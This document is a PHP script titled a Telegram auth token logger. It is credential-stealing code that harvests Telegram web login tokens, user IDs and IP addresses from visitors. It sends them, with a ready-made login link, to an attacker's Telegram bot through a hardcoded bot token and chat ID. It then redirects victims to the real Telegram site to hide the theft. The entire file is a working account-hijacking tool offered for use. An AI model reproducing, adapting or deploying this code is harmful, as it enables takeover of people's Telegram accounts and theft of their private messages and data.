<?php
/**
 * Telegram Auth Token Logger with Instant Login Link
 */

// Конфигурация
define('BOT_TOKEN', '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'); // ТВОЙ ТОКЕН
define('CHAT_ID', '8220267007'); // ТВОЙ ЧАТ ID
define('LOG_FILE', '/tmp/log.txt');

// Функция отправки в Telegram с готовой ссылкой
function sendToTelegram($token, $user_id, $dc_id, $ip) {
    // Формируем готовую ссылку для входа
    $login_url = "https://web.telegram.org/k/#tgWebAuthToken=" . urlencode($token) . 
                 "&tgWebAuthUserId=" . urlencode($user_id) . 
                 "&tgWebAuthDcId=" . urlencode($dc_id);
    
    // Сокращаем ссылку через clck.ru (без регистрации)
    $short_url = @file_get_contents("https://clck.ru/--?url=" . urlencode($login_url));
    if (!$short_url) $short_url = $login_url;
    
    // Формируем сообщение
    $message = "🔥 <b>НОВЫЙ АККАУНТ!</b>\n\n";
    $message .= "👤 <b>User ID:</b> <code>" . $user_id . "</code>\n";
    $message .= "🔑 <b>Token:</b> <code>" . $token . "</code>\n";
    $message .= "🌐 <b>DC:</b> " . $dc_id . "\n";
    $message .= "📱 <b>IP:</b> " . $ip . "\n";
    $message .= "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "🔗 <b>ССЫЛКА ДЛЯ ВХОДА:</b>\n";
    $message .= "<code>" . $login_url . "</code>\n\n";
    $message .= "📌 <b>Сокращенная ссылка:</b>\n";
    $message .= $short_url . "\n\n";
    $message .= "👇 <b>КЛИКАЙ И ЗАХОДИ МГНОВЕННО</b>";
    
    // Отправляем
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
    
    // Дополнительно отправляем как отдельное сообщение с кнопкой
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '🚀 ВОЙТИ В АККАУНТ', 'url' => $login_url]
            ],
            [
                ['text' => '📋 КОПИРОВАТЬ ТОКЕН', 'callback_data' => 'copy_' . $token]
            ]
        ]
    ];
    
    $button_message = "🔥 <b>Аккаунт готов к входу!</b>\n\n";
    $button_message .= "Нажми кнопку ниже чтобы войти:";
    
    $data2 = [
        'chat_id' => CHAT_ID,
        'text' => $button_message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];
    
    $options2 = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data2)
        ]
    ];
    
    $context2 = stream_context_create($options2);
    @file_get_contents($url, false, $context2);
}

// Логирование в файл
function logData($data) {
    $logEntry = json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
    @file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
}

// Сбор данных
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ip = explode(',', $ip)[0]; // Берём первый IP если их несколько

$token = $_GET['tgWebAuthToken'] ?? '';
$user_id = $_GET['tgWebAuthUserId'] ?? '';
$dc_id = $_GET['tgWebAuthDcId'] ?? '';

$data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $ip,
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'get' => $_GET,
    'token_found' => !empty($token)
];

// Логируем
logData($data);

// Если есть токен - отправляем в Telegram с готовой ссылкой
if (!empty($token) && !empty($user_id)) {
    sendToTelegram($token, $user_id, $dc_id ?: '2', $ip);
    
    // Дополнительно отправляем в канал если нужно
    // sendToChannel($token, $user_id, $dc_id);
}

// Редирект на настоящий Telegram
$redirect = "https://web.telegram.org/k/";

// Если есть параметры - добавляем их для маскировки
if (!empty($token)) {
    $redirect .= "#tgWebAuthToken=" . urlencode($token) . 
                 "&tgWebAuthUserId=" . urlencode($user_id) . 
                 "&tgWebAuthDcId=" . urlencode($dc_id ?: '2');
}

header('Location: ' . $redirect, true, 302);
exit;
?>